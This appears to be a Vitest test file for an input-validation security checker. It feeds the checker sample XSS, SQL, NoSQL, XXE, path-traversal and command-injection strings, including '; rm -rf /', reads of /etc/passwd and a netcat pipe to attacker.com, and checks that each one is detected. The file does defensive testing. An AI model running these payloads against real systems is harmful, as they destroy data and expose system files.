import { beforeEach, describe, expect, it } from 'vitest'
import { SecurityCheckerService } from '#microservice/Validation/services/security-checker.service'
import { createConfigServiceMock } from '../../helpers/config-service.mock.js'

describe('securityCheckerService', () => {
	let service: SecurityCheckerService

	beforeEach(() => {
		// maxStringLength is read once in the constructor; the over-length case
		// below depends on this value.
		service = new SecurityCheckerService(createConfigServiceMock({ 'validation.maxStringLength': 10000 }))
	})

	it('should be defined', () => {
		expect(service).toBeDefined()
	})

	describe('checkForMaliciousContent', () => {
		it('should detect script injection attempts', () => {
			const maliciousInputs = [
				'<script>alert("xss")</script>',
				'javascript:alert(1)',
				'vbscript:msgbox("evil")',
				'data:text/html,<script>alert(1)</script>',
				'onclick="alert(1)"',
			]

			for (const input of maliciousInputs) {
				expect(service.checkForMaliciousContent(input)).toBe(true)
			}
		})

		it('should detect SQL injection attempts', () => {
			const maliciousInputs = [
				'\'; DROP TABLE users; --',
				'UNION SELECT * FROM passwords',
				'INSERT INTO admin VALUES',
				'DELETE FROM users WHERE',
			]

			for (const input of maliciousInputs) {
				expect(service.checkForMaliciousContent(input)).toBe(true)
			}
		})

		it('should detect path traversal attempts', () => {
			const maliciousInputs = [
				'../../../etc/passwd',
				'..\\..\\windows\\system32',
				'%2e%2e%2f%2e%2e%2f',
				'%2e%2e%5c%2e%2e%5c',
			]

			for (const input of maliciousInputs) {
				expect(service.checkForMaliciousContent(input)).toBe(true)
			}
		})

		it('should detect traversal hidden behind mixed-case, partial, double and malformed percent-encoding', () => {
			const maliciousInputs = [
				'%2E%2E/etc/passwd', // mixed-case encoding, only visible after one decode
				'..%2fetc%2fpasswd', // partially encoded separator
				'%252e%252e%252fetc/passwd', // double-encoded ../
				'photo%zz.jpg', // malformed escape: decodeURIComponent throws → rejected
			]

			for (const input of maliciousInputs) {
				expect(service.checkForMaliciousContent(input)).toBe(true)
			}
		})

		it('should detect command injection attempts', () => {
			const maliciousInputs = [
				'; rm -rf /',
				'; cat /etc/passwd',
				'| nc attacker.com 4444',
				'; ls -la',
			]

			for (const input of maliciousInputs) {
				expect(service.checkForMaliciousContent(input)).toBe(true)
			}
		})

		it('should detect XXE attempts', () => {
			const maliciousInputs = [
				'<!ENTITY xxe SYSTEM "file:///etc/passwd">',
				'<!DOCTYPE foo [<!ELEMENT foo ANY>]>',
			]

			for (const input of maliciousInputs) {
				expect(service.checkForMaliciousContent(input)).toBe(true)
			}
		})

		it('should detect NoSQL operator injection attempts', () => {
			const maliciousInputs = [
				'{"$where": "this.password.length > 0"}',
				'{"username": {"$ne": null}}',
				'price[$gt]=0',
				'{"age": {"$lt": 100}}',
			]

			for (const input of maliciousInputs) {
				expect(service.checkForMaliciousContent(input)).toBe(true)
			}
		})

		it('should allow safe content', () => {
			const safeInputs = [
				'',
				'Hello World',
				'user@example.com',
				'https://example.com/image.jpg',
				'Normal text with numbers 123',
			]

			for (const input of safeInputs) {
				expect(service.checkForMaliciousContent(input)).toBe(false)
			}
		})

		it('should detect excessively long strings', () => {
			const longString = 'a'.repeat(15000)
			expect(service.checkForMaliciousContent(longString)).toBe(true)
		})

		it('should detect high entropy strings (potential encoded payloads)', () => {
			// Base64 encoded string with high entropy
			const highEntropyString = 'SGVsbG8gV29ybGQhIFRoaXMgaXMgYSB0ZXN0IHN0cmluZyB3aXRoIGhpZ2ggZW50cm9weQ=='
			expect(service.checkForMaliciousContent(highEntropyString)).toBe(true)
		})

		it('should exempt image filenames from the entropy check (upload names carry random suffixes)', () => {
			// Same payload as the high-entropy case above; only the image extension
			// changes the verdict, so this proves the exemption is what is at work.
			const highEntropyString = 'SGVsbG8gV29ybGQhIFRoaXMgaXMgYSB0ZXN0IHN0cmluZyB3aXRoIGhpZ2ggZW50cm9weQ=='
			expect(service.checkForMaliciousContent(`${highEntropyString}.png`)).toBe(false)
			expect(service.checkForMaliciousContent('hero-banner__a8Xk29QzLmT4vB7nW.webp')).toBe(false)
		})
	})
})
